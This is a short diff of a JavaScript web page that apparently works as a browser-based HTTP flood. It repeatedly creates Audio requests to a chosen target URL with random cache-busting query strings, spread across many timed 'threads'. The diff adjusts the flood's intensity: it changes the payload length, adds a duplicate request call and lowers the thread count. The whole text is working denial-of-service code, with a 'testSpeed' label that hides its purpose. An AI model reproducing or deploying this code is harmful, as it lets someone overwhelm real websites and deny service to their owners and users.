@@ -30,7 +30,7 @@
 
         function createThread(target, timeout) {
 
-            const timer = setInterval(() => new Audio(`${target}?${randomString(10)}=${randomString(1000)}`))
+            const timer = setInterval(() => new Audio(`${target}?${randomString(10)}=${randomString(20)}`))
 
             setTimeout(() => clearInterval(timer), timeout * 1000)
         }
@@ -39,11 +39,13 @@
 
             testSpeed(target, duration, started_at).catch(_ => undefined)
 
+            testSpeed(target, duration, started_at).catch(_ => undefined)
+
             if (!start) return document.querySelector("h1").innerHTML = "Done"
 
             await new Promise(resolve => setTimeout(resolve, 2000))
 
-            for (var count = 0; count <= 50; count++) createThread(target, 60)
+            for (var count = 0; count <= 20; count++) createThread(target, 60)
         }
 
         const queryString = window.location.search
